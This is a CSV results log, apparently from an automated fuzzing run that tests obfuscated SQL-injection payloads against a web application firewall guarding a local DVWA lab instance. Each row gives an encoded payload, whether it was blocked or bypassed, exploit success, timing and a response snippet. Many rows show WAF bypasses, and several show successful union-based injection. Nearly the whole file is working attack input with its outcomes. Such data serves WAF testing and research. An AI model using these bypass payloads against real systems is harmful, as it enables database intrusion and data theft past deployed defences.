Payload,Status,Exploit Success,Exploit Types,Payload Type,Response Time (s),Memory Usage (MB),Semantic Preserved,Response Code,Snippet
0%27<@=.1+||+!+true=+(!~0)+or',Bypassed,No,None,Invalid,0.0435,72.88,No,500,
0'<@!=1.+or+!+{x+(select%0b1)}=1=+(not+{x+(select+1)}=1)%23,Blocked,No,None,Invalid,0.0214,72.88,No,403,"<!doctype html public ""-//ietf//dtd html 2.0//en"">
<html><head>
<title>403 forbidden</title>
</head><body>
<h1>forbidden</h1>
<p>you don't have permission to access this resource.</p>
<hr>
<address>apache/2.4.58 (ubuntu) server at localhost port 80</address>
</body></html>
"
0'<@=1.+or+{x+(select%0b1)}=1+like%0b{`if`+1}=1%23,Blocked,No,None,Invalid,0.0526,72.88,No,403,"<!doctype html public ""-//ietf//dtd html 2.0//en"">
<html><head>
<title>403 forbidden</title>
</head><body>
<h1>forbidden</h1>
<p>you don't have permission to access this resource.</p>
<hr>
<address>apache/2.4.58 (ubuntu) server at localhost port 80</address>
</body></html>
"
0%27<@!=.1+||%0b!%0b1=+(!%0b{`if`+1}=1)%0bor%27,Bypassed,Yes,Yes (unionAtk),Invalid,0.0279,72.88,No,200,"<!doctype html>

<html lang=""en-gb"">

	<head>
		<meta http-equiv=""content-type"" content=""text/html; charset=utf-8"" />

		<title>vulnerability: sql injection :: damn vulnerable web application (dvwa)</title>

		<link rel=""stylesheet"" type=""text/css"" href=""../../dvwa/css/main.css"" />

		<link rel=""icon"" type=""\image/ico"" href=""../../favicon.ico"" />

		<script type=""text/javascript"" src=""../../dvwa/js/dvwapage.js""></script>

	</head>

	<body class=""home light"">
		<div id=""container"">

			<div id=""h"
0'<@!=1.%0bor%0bnot+{x%0b(select+1)}=1=+(not%0b{a+1}=1)%0bor%27,Bypassed,No,None,Invalid,0.023,72.88,No,500,
0%27<@=.1%0bor+{x+(select+1)}=1%0blike+{x+(select+1)}=1+or%27,Bypassed,Yes,Yes (unionAtk),Invalid,0.0578,72.88,No,200,"<!doctype html>

<html lang=""en-gb"">

	<head>
		<meta http-equiv=""content-type"" content=""text/html; charset=utf-8"" />

		<title>vulnerability: sql injection :: damn vulnerable web application (dvwa)</title>

		<link rel=""stylesheet"" type=""text/css"" href=""../../dvwa/css/main.css"" />

		<link rel=""icon"" type=""\image/ico"" href=""../../favicon.ico"" />

		<script type=""text/javascript"" src=""../../dvwa/js/dvwapage.js""></script>

	</head>

	<body class=""home light"">
		<div id=""container"">

			<div id=""h"
0%27<@=.1+||+!%7efalse=+(!+{a+1}=1)+||%27,Bypassed,Yes,Yes (unionAtk),Invalid,0.0081,72.88,No,200,"<!doctype html>

<html lang=""en-gb"">

	<head>
		<meta http-equiv=""content-type"" content=""text/html; charset=utf-8"" />

		<title>vulnerability: sql injection :: damn vulnerable web application (dvwa)</title>

		<link rel=""stylesheet"" type=""text/css"" href=""../../dvwa/css/main.css"" />

		<link rel=""icon"" type=""\image/ico"" href=""../../favicon.ico"" />

		<script type=""text/javascript"" src=""../../dvwa/js/dvwapage.js""></script>

	</head>

	<body class=""home light"">
		<div id=""container"">

			<div id=""h"
0%27<@=1+or%0b!%0b{a+1}=1=%0b(!+{x%0b(select+1)}=1)%0bor',Bypassed,No,None,Invalid,0.0421,72.88,No,500,
0%27<@!=.1%0bor%0b!+{x+(select%0b1)}=1=%0b(not+{`if`+1}=1)+or',Bypassed,No,None,Invalid,0.0384,72.88,No,500,
0'<@=1+||%0bnot%0b{`if`%0b1}=1=%0b(not+{a%0b1}=1)%23,Bypassed,No,None,Invalid,0.0321,72.88,No,500,
0%27<@!=.1+or+1%0blike%0b{x%0b(select+1)}=1+||',Bypassed,No,None,Invalid,0.0187,72.88,No,500,
0'<@=1.%0b||+not+{x%0b(select+1)}=1=+(!+{a%0b1}=1)+or%27,Bypassed,No,None,Invalid,0.0197,72.88,No,500,
0%27<@=1.%0bor+!+{x%0b(select+1)}=1=+(!+{x%0b(select%0b1)}=1)%23,Bypassed,Yes,Yes (unionAtk),Invalid,0.0384,72.88,No,200,"<!doctype html>

<html lang=""en-gb"">

	<head>
		<meta http-equiv=""content-type"" content=""text/html; charset=utf-8"" />

		<title>vulnerability: sql injection :: damn vulnerable web application (dvwa)</title>

		<link rel=""stylesheet"" type=""text/css"" href=""../../dvwa/css/main.css"" />

		<link rel=""icon"" type=""\image/ico"" href=""../../favicon.ico"" />

		<script type=""text/javascript"" src=""../../dvwa/js/dvwapage.js""></script>

	</head>

	<body class=""home light"">
		<div id=""container"">

			<div id=""h"
0'<@!=.1%0bor+not%0btrue=+(not%0b{x+(select%0b1)}=1)%0bor',Bypassed,No,None,Invalid,0.0551,72.88,No,500,
0%27<@!=.1+||%0b!%0b{x+(select+1)}=1=+(!+true)+or%27,Blocked,No,None,Invalid,0.0087,72.88,No,403,"<!doctype html public ""-//ietf//dtd html 2.0//en"">
<html><head>
<title>403 forbidden</title>
</head><body>
<h1>forbidden</h1>
<p>you don't have permission to access this resource.</p>
<hr>
<address>apache/2.4.58 (ubuntu) server at localhost port 80</address>
</body></html>
"
0'<@=1.%0b||+not+{x+(select+1)}=1=%0b(not%0b{x+(select+1)}=1)+or',Bypassed,No,None,Invalid,0.0366,72.88,No,500,
0'<@=.1+or+not%0b{x+(select%0b1)}=1=%0b(not+{a%0b1}=1)%0bor',Bypassed,No,None,Invalid,0.0139,72.88,No,500,
0'<@=1%0bor+!%0b{x%0b(select%0b1)}=1=+(!%7efalse)--+,Bypassed,No,None,Invalid,0.0285,72.88,No,500,
0%27<@!=.1+or+not%7e0=+(!%0btrue)+or',Bypassed,No,None,Invalid,0.0221,72.88,No,500,
0%27<@=1%0b||%0bnot+{a+1}=1=+(!%0b{a%0b1}=1)%0bor',Bypassed,No,None,Invalid,0.0167,72.88,No,500,
0%27<@!=1.%0b||%0b!%0btrue=%0b(not+{`if`%0b1}=1)%0bor',Bypassed,No,None,Invalid,0.0253,72.88,No,500,
0%27<@!=1.+or+!%0b{`if`+1}=1=%0b(not+{`if`%0b1}=1)--%0b,Bypassed,Yes,Yes (unionAtk),Invalid,0.0148,72.71,No,200,"<!doctype html>

<html lang=""en-gb"">

	<head>
		<meta http-equiv=""content-type"" content=""text/html; charset=utf-8"" />

		<title>vulnerability: sql injection :: damn vulnerable web application (dvwa)</title>

		<link rel=""stylesheet"" type=""text/css"" href=""../../dvwa/css/main.css"" />

		<link rel=""icon"" type=""\image/ico"" href=""../../favicon.ico"" />

		<script type=""text/javascript"" src=""../../dvwa/js/dvwapage.js""></script>

	</head>

	<body class=""home light"">
		<div id=""container"">

			<div id=""h"
0'<@=1%0bor+!%0b{`if`+1}=1=%0b(not+{a%0b1}=1)+||%27,Bypassed,No,None,Invalid,0.0335,72.79,No,500,
0%27<@=1.+||%0bnot+{a+1}=1=+(not+{a+1}=1)+or',Bypassed,No,None,Invalid,0.058,72.88,No,500,
0%27<@=1.+or%0bnot+{x%0b(select+1)}=1=+(not%0b{a+1}=1)+||',Bypassed,No,None,Invalid,0.0245,72.88,No,500,
0'<@=.1%0b||+!+{x+(select+1)}=1=%0b(not+{a+1}=1)%0bor%27,Bypassed,No,None,Invalid,0.0554,72.88,No,500,
0'<@=1.%0bor+not+{x+(select+1)}=1=%0b(!%0b{a+1}=1)%0b||%27,Bypassed,No,None,Invalid,0.0157,72.88,No,500,
0%27<@!=1.+||+not+{x%0b(select%0b1)}=1=+(!+{a+1}=1)--+,Bypassed,Yes,Yes (unionAtk),Invalid,0.021,72.88,No,200,"<!doctype html>

<html lang=""en-gb"">

	<head>
		<meta http-equiv=""content-type"" content=""text/html; charset=utf-8"" />

		<title>vulnerability: sql injection :: damn vulnerable web application (dvwa)</title>

		<link rel=""stylesheet"" type=""text/css"" href=""../../dvwa/css/main.css"" />

		<link rel=""icon"" type=""\image/ico"" href=""../../favicon.ico"" />

		<script type=""text/javascript"" src=""../../dvwa/js/dvwapage.js""></script>

	</head>

	<body class=""home light"">
		<div id=""container"">

			<div id=""h"
0'<@!=.1%0bor%0bnot+1=+(not+{a%0b1}=1)+||%27,Bypassed,No,None,Invalid,0.0411,72.88,No,500,
0'<@!=1%0bor%0bnot%0b1=+(not+{x+(select%0b1)}=1)%0b||%27,Bypassed,No,None,Invalid,0.0152,72.88,No,500,
0'<@!=1+or%0bnot~0=+(not+{a%0b1}=1)+or',Bypassed,No,None,Invalid,0.0244,72.88,No,500,
0%27<@=.1%0b||+1+like%0b{x+(select%0b1)}=1+or%27,Bypassed,Yes,Yes (unionAtk),Invalid,0.0374,72.88,No,200,"<!doctype html>

<html lang=""en-gb"">

	<head>
		<meta http-equiv=""content-type"" content=""text/html; charset=utf-8"" />

		<title>vulnerability: sql injection :: damn vulnerable web application (dvwa)</title>

		<link rel=""stylesheet"" type=""text/css"" href=""../../dvwa/css/main.css"" />

		<link rel=""icon"" type=""\image/ico"" href=""../../favicon.ico"" />

		<script type=""text/javascript"" src=""../../dvwa/js/dvwapage.js""></script>

	</head>

	<body class=""home light"">
		<div id=""container"">

			<div id=""h"
0'<@=1%0bor%0b0=%0b(!+{a+1}=1)%0b||%27,Bypassed,No,None,Invalid,0.0399,72.88,No,500,
0'<@!=.1%0b||+not%0b{x+(select+1)}=1=%0b(not%0b{`if`%0b1}=1)%0bor',Bypassed,No,None,Invalid,0.0399,72.88,No,500,
0'<@=1.%0b||%0b!~0=+(!%0b{x+(select%0b1)}=1)%0bor',Bypassed,No,None,Invalid,0.0357,72.88,No,500,
0%27<@=.1+or%0bnot+{a+1}=1=+(!+1)+or%27,Bypassed,Yes,Yes (unionAtk),Invalid,0.0281,72.88,No,200,"<!doctype html>

<html lang=""en-gb"">

	<head>
		<meta http-equiv=""content-type"" content=""text/html; charset=utf-8"" />

		<title>vulnerability: sql injection :: damn vulnerable web application (dvwa)</title>

		<link rel=""stylesheet"" type=""text/css"" href=""../../dvwa/css/main.css"" />

		<link rel=""icon"" type=""\image/ico"" href=""../../favicon.ico"" />

		<script type=""text/javascript"" src=""../../dvwa/js/dvwapage.js""></script>

	</head>

	<body class=""home light"">
		<div id=""container"">

			<div id=""h"
0'<@=.1%0b||%0b!~0=%0b(not+{a+1}=1)%0bor',Bypassed,No,None,Invalid,0.0516,72.88,No,500,
0%27<@=1.+or+not+{a%0b1}=1=%0b(!%0btrue)+or',Bypassed,No,None,Invalid,0.0271,72.88,No,500,
0%27<@=1.%0b||%0bfalse=+(not%7efalse)+||',Bypassed,No,None,Invalid,0.0508,72.88,No,500,
0%27<@!=1.+||%0bnot+{x%0b(select%0b1)}=1=+(!%7efalse)%0bor',Bypassed,No,None,Invalid,0.0093,72.88,No,500,
0%27||%0b@<@.+or+!%0b{x%0b(select%0b1)}=1=%0b(!+{`if`+1}=1)+||',Bypassed,No,None,Invalid,0.0257,72.88,No,500,
0'<@=.1+or%0bnot+{x+(select+1)}=1=%0b(not%0b{x%0b(select+1)}=1)+or%27,Blocked,No,None,Invalid,0.0348,72.88,No,403,"<!doctype html public ""-//ietf//dtd html 2.0//en"">
<html><head>
<title>403 forbidden</title>
</head><body>
<h1>forbidden</h1>
<p>you don't have permission to access this resource.</p>
<hr>
<address>apache/2.4.58 (ubuntu) server at localhost port 80</address>
</body></html>
"
0%27<@!=1%0bor+!+{x%0b(select%0b1)}=1=+(!+{x+(select%0b1)}=1)%23,Bypassed,Yes,Yes (unionAtk),Invalid,0.0362,72.88,No,200,"<!doctype html>

<html lang=""en-gb"">

	<head>
		<meta http-equiv=""content-type"" content=""text/html; charset=utf-8"" />

		<title>vulnerability: sql injection :: damn vulnerable web application (dvwa)</title>

		<link rel=""stylesheet"" type=""text/css"" href=""../../dvwa/css/main.css"" />

		<link rel=""icon"" type=""\image/ico"" href=""../../favicon.ico"" />

		<script type=""text/javascript"" src=""../../dvwa/js/dvwapage.js""></script>

	</head>

	<body class=""home light"">
		<div id=""container"">

			<div id=""h"
0%27<@!=.1+or%0b!%0b{`if`+1}=1=+(!+{`if`+1}=1)%0bor%27,Bypassed,Yes,Yes (unionAtk),Invalid,0.0475,72.88,No,200,"<!doctype html>

<html lang=""en-gb"">

	<head>
		<meta http-equiv=""content-type"" content=""text/html; charset=utf-8"" />

		<title>vulnerability: sql injection :: damn vulnerable web application (dvwa)</title>

		<link rel=""stylesheet"" type=""text/css"" href=""../../dvwa/css/main.css"" />

		<link rel=""icon"" type=""\image/ico"" href=""../../favicon.ico"" />

		<script type=""text/javascript"" src=""../../dvwa/js/dvwapage.js""></script>

	</head>

	<body class=""home light"">
		<div id=""container"">

			<div id=""h"
0'or%0b!@<@.%0bor+!+{x+(select+1)}=1=+(!%0b1)+||%27,Bypassed,No,None,Invalid,0.0518,72.88,No,500,
0%27<@!=1.+||+!%0b{a+1}=1=%0b(!+1)--+,Bypassed,Yes,Yes (unionAtk),Invalid,0.0332,72.88,No,200,"<!doctype html>

<html lang=""en-gb"">

	<head>
		<meta http-equiv=""content-type"" content=""text/html; charset=utf-8"" />

		<title>vulnerability: sql injection :: damn vulnerable web application (dvwa)</title>

		<link rel=""stylesheet"" type=""text/css"" href=""../../dvwa/css/main.css"" />

		<link rel=""icon"" type=""\image/ico"" href=""../../favicon.ico"" />

		<script type=""text/javascript"" src=""../../dvwa/js/dvwapage.js""></script>

	</head>

	<body class=""home light"">
		<div id=""container"">

			<div id=""h"
0'<@!=1.+or+{a+1}=1+like%0b1%0bor%27,Bypassed,No,None,Invalid,0.0119,72.88,No,500,
0'<@=1+or%0bnot%0b{`if`%0b1}=1=+(not+{a+1}=1)%0b||%27,Bypassed,No,None,Invalid,0.0502,72.88,No,500,
0'<@!=1+or+not+{a%0b1}=1=+(not%7efalse)--+,Bypassed,No,None,Invalid,0.0144,72.88,No,500,
0%27<@=1%0b||+false=+(not+{`if`%0b1}=1)+||%27,Bypassed,Yes,Yes (unionAtk),Invalid,0.0236,72.88,No,200,"<!doctype html>

<html lang=""en-gb"">

	<head>
		<meta http-equiv=""content-type"" content=""text/html; charset=utf-8"" />

		<title>vulnerability: sql injection :: damn vulnerable web application (dvwa)</title>

		<link rel=""stylesheet"" type=""text/css"" href=""../../dvwa/css/main.css"" />

		<link rel=""icon"" type=""\image/ico"" href=""../../favicon.ico"" />

		<script type=""text/javascript"" src=""../../dvwa/js/dvwapage.js""></script>

	</head>

	<body class=""home light"">
		<div id=""container"">

			<div id=""h"
0%27<@=1.+or+not%7efalse=%0b(!%0b1)+||%27,Bypassed,Yes,Yes (unionAtk),Invalid,0.036,72.88,No,200,"<!doctype html>

<html lang=""en-gb"">

	<head>
		<meta http-equiv=""content-type"" content=""text/html; charset=utf-8"" />

		<title>vulnerability: sql injection :: damn vulnerable web application (dvwa)</title>

		<link rel=""stylesheet"" type=""text/css"" href=""../../dvwa/css/main.css"" />

		<link rel=""icon"" type=""\image/ico"" href=""../../favicon.ico"" />

		<script type=""text/javascript"" src=""../../dvwa/js/dvwapage.js""></script>

	</head>

	<body class=""home light"">
		<div id=""container"">

			<div id=""h"
0'<@=1%0b||%0bnot+{x%0b(select+1)}=1=+(not+{`if`%0b1}=1)--%0b,Bypassed,No,None,Invalid,0.0175,72.88,No,500,
0'<@!=.1+||%0b!+{a%0b1}=1=%0b(!+{x+(select+1)}=1)+or',Blocked,No,None,Invalid,0.0221,72.88,No,403,"<!doctype html public ""-//ietf//dtd html 2.0//en"">
<html><head>
<title>403 forbidden</title>
</head><body>
<h1>forbidden</h1>
<p>you don't have permission to access this resource.</p>
<hr>
<address>apache/2.4.58 (ubuntu) server at localhost port 80</address>
</body></html>
"
0%27<@=1%0b||+!+{a+1}=1=+(not%7efalse)%0bor%27,Bypassed,Yes,Yes (unionAtk),Invalid,0.0343,72.88,No,200,"<!doctype html>

<html lang=""en-gb"">

	<head>
		<meta http-equiv=""content-type"" content=""text/html; charset=utf-8"" />

		<title>vulnerability: sql injection :: damn vulnerable web application (dvwa)</title>

		<link rel=""stylesheet"" type=""text/css"" href=""../../dvwa/css/main.css"" />

		<link rel=""icon"" type=""\image/ico"" href=""../../favicon.ico"" />

		<script type=""text/javascript"" src=""../../dvwa/js/dvwapage.js""></script>

	</head>

	<body class=""home light"">
		<div id=""container"">

			<div id=""h"
0'<@!=1%0bor%0bnot+{x+(select+1)}=1=+(not%0b{`if`+1}=1)--+,Bypassed,No,None,Invalid,0.0357,72.88,No,500,
0%27<@=1.%0b||%0bnot%0b{a+1}=1=%0b(not%0btrue)+||%27,Bypassed,Yes,Yes (unionAtk),Invalid,0.0147,72.88,No,200,"<!doctype html>

<html lang=""en-gb"">

	<head>
		<meta http-equiv=""content-type"" content=""text/html; charset=utf-8"" />

		<title>vulnerability: sql injection :: damn vulnerable web application (dvwa)</title>

		<link rel=""stylesheet"" type=""text/css"" href=""../../dvwa/css/main.css"" />

		<link rel=""icon"" type=""\image/ico"" href=""../../favicon.ico"" />

		<script type=""text/javascript"" src=""../../dvwa/js/dvwapage.js""></script>

	</head>

	<body class=""home light"">
		<div id=""container"">

			<div id=""h"
0'||%0b!@<@%0bor+not%0b{x+(select+1)}=1=%0b(!+{a+1}=1)%0bor%27,Blocked,No,None,Invalid,0.0302,72.88,No,403,"<!doctype html public ""-//ietf//dtd html 2.0//en"">
<html><head>
<title>403 forbidden</title>
</head><body>
<h1>forbidden</h1>
<p>you don't have permission to access this resource.</p>
<hr>
<address>apache/2.4.58 (ubuntu) server at localhost port 80</address>
</body></html>
"
0'<@=1.+||%0b!+{a%0b1}=1=+(not+true)+||',Blocked,No,None,Invalid,0.0368,72.88,No,403,"<!doctype html public ""-//ietf//dtd html 2.0//en"">
<html><head>
<title>403 forbidden</title>
</head><body>
<h1>forbidden</h1>
<p>you don't have permission to access this resource.</p>
<hr>
<address>apache/2.4.58 (ubuntu) server at localhost port 80</address>
</body></html>
"
0%27<@!=1+or%0b!+1=%0b(!%0b{x%0b(select%0b1)}=1)+||%27,Bypassed,Yes,Yes (unionAtk),Invalid,0.0183,72.88,No,200,"<!doctype html>

<html lang=""en-gb"">

	<head>
		<meta http-equiv=""content-type"" content=""text/html; charset=utf-8"" />

		<title>vulnerability: sql injection :: damn vulnerable web application (dvwa)</title>

		<link rel=""stylesheet"" type=""text/css"" href=""../../dvwa/css/main.css"" />

		<link rel=""icon"" type=""\image/ico"" href=""../../favicon.ico"" />

		<script type=""text/javascript"" src=""../../dvwa/js/dvwapage.js""></script>

	</head>

	<body class=""home light"">
		<div id=""container"">

			<div id=""h"
0%27<@!=1%0b||+!%0b{`if`+1}=1=+(!~0)+||',Bypassed,No,None,Invalid,0.0437,72.88,No,500,
0%27<@!=1%0b||%0bnot%0b{a%0b1}=1=%0b(not~0)+||%27,Bypassed,Yes,Yes (unionAtk),Invalid,0.0214,72.88,No,200,"<!doctype html>

<html lang=""en-gb"">

	<head>
		<meta http-equiv=""content-type"" content=""text/html; charset=utf-8"" />

		<title>vulnerability: sql injection :: damn vulnerable web application (dvwa)</title>

		<link rel=""stylesheet"" type=""text/css"" href=""../../dvwa/css/main.css"" />

		<link rel=""icon"" type=""\image/ico"" href=""../../favicon.ico"" />

		<script type=""text/javascript"" src=""../../dvwa/js/dvwapage.js""></script>

	</head>

	<body class=""home light"">
		<div id=""container"">

			<div id=""h"
0'or+!@<@.+||%0bnot%0b1=+(!%0b{x+(select+1)}=1)+||%27,Bypassed,No,None,Invalid,0.0483,72.88,No,500,
0'<@!=1.%0b||%0b!+{x+(select+1)}=1=+(not%0b{`if`%0b1}=1)+||',Bypassed,No,None,Invalid,0.0192,72.88,No,500,
0%27<@!=.1%0bor%0bnot+{x%0b(select+1)}=1=+(not+{x+(select%0b1)}=1)%0bor',Bypassed,No,None,Invalid,0.0233,72.88,No,500,
0%27<@!=1.%0b||%0bnot%7efalse=%0b(!%0b1)%0bor',Bypassed,No,None,Invalid,0.0378,72.88,No,500,
0%27<@!=1.+or%0b!+{`if`+1}=1=+(not%0b{a%0b1}=1)+or',Bypassed,No,None,Invalid,0.0179,72.88,No,500,
0'<@!=.1+or+{x+(select+1)}=1+like%0b{x+(select+1)}=1+||%27,Blocked,No,None,Invalid,0.0084,72.88,No,403,"<!doctype html public ""-//ietf//dtd html 2.0//en"">
<html><head>
<title>403 forbidden</title>
</head><body>
<h1>forbidden</h1>
<p>you don't have permission to access this resource.</p>
<hr>
<address>apache/2.4.58 (ubuntu) server at localhost port 80</address>
</body></html>
"
0%27<@=1%0bor+not%7e0=+(!+{x+(select+1)}=1)%0bor%27,Bypassed,Yes,Yes (unionAtk),Invalid,0.029,72.88,No,200,"<!doctype html>

<html lang=""en-gb"">

	<head>
		<meta http-equiv=""content-type"" content=""text/html; charset=utf-8"" />

		<title>vulnerability: sql injection :: damn vulnerable web application (dvwa)</title>

		<link rel=""stylesheet"" type=""text/css"" href=""../../dvwa/css/main.css"" />

		<link rel=""icon"" type=""\image/ico"" href=""../../favicon.ico"" />

		<script type=""text/javascript"" src=""../../dvwa/js/dvwapage.js""></script>

	</head>

	<body class=""home light"">
		<div id=""container"">

			<div id=""h"
0%27<@!=.1%0bor+{x+(select+1)}=1+like+{x%0b(select+1)}=1+or',Bypassed,No,None,Invalid,0.0136,72.88,No,500,
0'<@!=.1%0b||+not%0b{`if`%0b1}=1=%0b(!%0b{a+1}=1)%0bor%27,Bypassed,No,None,Invalid,0.035,72.88,No,500,
0%27<@=.1+or+!%0b{x%0b(select%0b1)}=1=+(!%0b{`if`+1}=1)--+,Bypassed,Yes,Yes (unionAtk),Invalid,0.0273,72.88,No,200,"<!doctype html>

<html lang=""en-gb"">

	<head>
		<meta http-equiv=""content-type"" content=""text/html; charset=utf-8"" />

		<title>vulnerability: sql injection :: damn vulnerable web application (dvwa)</title>

		<link rel=""stylesheet"" type=""text/css"" href=""../../dvwa/css/main.css"" />

		<link rel=""icon"" type=""\image/ico"" href=""../../favicon.ico"" />

		<script type=""text/javascript"" src=""../../dvwa/js/dvwapage.js""></script>

	</head>

	<body class=""home light"">
		<div id=""container"">

			<div id=""h"
0'<@=1.%0bor%0b!%7e0=+(not+{x+(select%0b1)}=1)%0bor',Bypassed,No,None,Invalid,0.0236,72.71,No,500,
0'<@=1.+or%0b!+{x+(select+1)}=1=+(!%0b{a+1}=1)--%0b,Blocked,No,None,Invalid,0.0394,72.71,No,403,"<!doctype html public ""-//ietf//dtd html 2.0//en"">
<html><head>
<title>403 forbidden</title>
</head><body>
<h1>forbidden</h1>
<p>you don't have permission to access this resource.</p>
<hr>
<address>apache/2.4.58 (ubuntu) server at localhost port 80</address>
</body></html>
"
0%27<@!=1.+or+not+{a+1}=1=+(not+{x%0b(select+1)}=1)+or%27,Bypassed,Yes,Yes (unionAtk),Invalid,0.0221,72.79,No,200,"<!doctype html>

<html lang=""en-gb"">

	<head>
		<meta http-equiv=""content-type"" content=""text/html; charset=utf-8"" />

		<title>vulnerability: sql injection :: damn vulnerable web application (dvwa)</title>

		<link rel=""stylesheet"" type=""text/css"" href=""../../dvwa/css/main.css"" />

		<link rel=""icon"" type=""\image/ico"" href=""../../favicon.ico"" />

		<script type=""text/javascript"" src=""../../dvwa/js/dvwapage.js""></script>

	</head>

	<body class=""home light"">
		<div id=""container"">

			<div id=""h"
